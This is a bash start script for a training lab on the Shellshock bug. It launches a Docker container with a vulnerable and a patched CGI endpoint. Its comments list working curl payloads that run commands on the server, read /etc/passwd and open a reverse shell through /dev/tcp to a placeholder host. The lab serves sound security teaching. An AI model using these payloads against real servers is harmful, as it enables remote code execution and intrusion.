#!/usr/bin/env bash
# ==============================================================================
# Lab 05 — Shellshock Vulnerability Lab: Start Script
#
# Starts:
#   shellshock-10.9.0.80 -> Apache CGI server on port 10086
#     /cgi-bin/vul.cgi   -> Vulnerable endpoint (uses bash_shellshock copy)
#     /cgi-bin/safe.cgi  -> Safe endpoint (uses patched /bin/bash)
#
# Lab tasks (run from your host terminal after containers start):
#
#   Task 1 — Confirm the vulnerability exists:
#     curl -A "() { :; }; echo; echo Content-Type: text/plain; echo; echo VULNERABLE" \
#          http://localhost:10086/cgi-bin/vul.cgi
#
#   Task 2 — Execute a command on the server (RCE):
#     curl -A "() { :; }; echo; /bin/cat /etc/passwd" \
#          http://localhost:10086/cgi-bin/vul.cgi
#
#   Task 3 — Confirm safe.cgi is NOT vulnerable:
#     curl -A "() { :; }; echo; echo SHOULD-NOT-APPEAR" \
#          http://localhost:10086/cgi-bin/safe.cgi
#
#   Task 4 — Get a reverse shell (advanced):
#     On host: nc -lvp 9090
#     Attack:  curl -A "() { :; }; /bin/bash -i > /dev/tcp/<HOST_IP>/9090 0<&1 2>&1" \
#              http://localhost:10086/cgi-bin/vul.cgi
# ==============================================================================

set -euo pipefail
GREEN='\033[0;32m'; BOLD='\033[1m'; RESET='\033[0m'

echo -e "${BOLD}[Lab 05] Shellshock Vulnerability Lab — Starting Container${RESET}"
echo "-----------------------------------------------------------"
docker compose up -d
echo ""
docker compose ps
echo ""
echo -e "${GREEN}Lab 05 is running.${RESET}"
echo ""
echo "  Vulnerable CGI endpoint:"
echo "    http://localhost:10086/cgi-bin/vul.cgi"
echo ""
echo "  Safe CGI endpoint (for comparison):"
echo "    http://localhost:10086/cgi-bin/safe.cgi"
echo ""
echo "  Quick exploit test:"
echo "    curl.exe -A \"() { :; }; echo; echo Content-Type: text/plain; echo; id\" http://localhost:10086/cgi-bin/vul.cgi"
echo ""
echo "  Container shell access (inspect bash binaries):"
echo "    docker exec -it shellshock-10.9.0.80 bash"
echo "    Inside container: ls -la /bin/bash*"
